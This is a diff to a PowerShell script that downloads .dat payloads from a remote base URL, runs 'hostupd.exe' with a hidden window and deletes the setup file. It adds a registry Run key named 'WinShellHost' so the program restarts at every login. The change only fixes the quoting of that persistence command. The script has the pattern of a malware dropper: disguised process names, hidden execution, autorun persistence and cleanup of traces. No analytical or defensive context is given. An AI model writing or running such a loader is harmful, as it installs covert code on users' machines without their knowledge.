@@ -8,5 +8,6 @@ Invoke-WebRequest "$base/setup.dat" -OutFile "$dir\setup.dat"
 Invoke-WebRequest "$base/svc.dat" -OutFile "$dir\svc.dat"
 Start-Process -FilePath "$dir\hostupd.exe" -ArgumentList '-local',"$dir\setup.dat" -WindowStyle Hidden -Wait
 Remove-Item "$dir\setup.dat" -Force
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WinShellHost /t REG_SZ /d "`"$dir\hostupd.exe`" -local `"$dir\svc.dat`"" /f | Out-Null
+$val = '"' + $dir + '\hostupd.exe" -local "' + $dir + '\svc.dat"'
+reg add 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run' /v WinShellHost /t REG_SZ /d "$val" /f | Out-Null
 Start-Process -FilePath "$dir\hostupd.exe" -ArgumentList '-local',"$dir\svc.dat" -WindowStyle Hidden
